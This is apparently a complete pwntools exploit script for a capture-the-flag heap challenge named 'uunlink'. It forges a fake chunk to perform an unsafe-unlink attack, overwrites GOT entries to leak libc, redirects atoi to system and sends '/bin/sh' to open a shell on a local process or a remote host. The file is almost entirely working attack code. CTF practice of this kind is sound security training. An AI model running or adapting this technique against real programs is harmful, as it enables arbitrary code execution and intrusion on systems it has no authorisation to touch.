#coding=utf8
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
local = 1
elf = ELF('./uunlink')
if local:
    p = process('./uunlink')
    libc = elf.libc
else:
    p = remote('172.16.229.161',7001)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
def bk(addr):
    gdb.attach(p,"b *"+str(hex(addr)))
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))


def malloc(index,size):
    ru("Your choice: ")
    sl('1')
    ru("Give me a book ID: ")
    sl(str(index))
    ru("how long: ")
    sl(str(size))

def free(index):
    ru("Your choice: ")
    sl('3')
    ru("Which one to throw?")
    sl(str(index))

def edit(index,size,content):
    ru("Your choice: ")
    sl('4')
    ru("Which book to write?")
    sl(str(index))
    ru("how big?")
    sl(str(size))
    ru("Content: ")
    sl(content)

atoi_got = elf.got["atoi"]
free_got = elf.got["free"]
puts_plt = elf.sym["puts"]
malloc(0,0x30)
malloc(1,0xf0)
malloc(2,0x100)
malloc(3,0x100)
fd = 0x00602300-0x18
bk = 0x00602300-0x10
py = ''
py += p64(0) + p64(0x31)
py += p64(fd) + p64(bk)
py += p64(0) + p64(0)
py += p64(0x30) + p64(0x100)
edit(0,0x60,py)
# gdb.attach(p,"b *0x000000000400BA0")
free(1)
py = ''
py += 'a'*0x18
py += p64(atoi_got)
py += p64(atoi_got)
py += p64(free_got)

edit(0,0x60,py)
# gdb.attach(p,"b *0x0000000000400C89")
edit(2,0x10,p64(puts_plt))
free(0)
rc(1)
addr = u64(rc(6).ljust(8,'\x00'))-libc.sym["atoi"]
print "addr--->"+hex(addr)
system = addr + libc.sym["system"]
gdb.attach(p,"b *0x00000000000000400C53")
edit(1,0x10,p64(system))
# bk(0)
ru("Your choice: ")
sl('/bin/sh\x00')
p.interactive()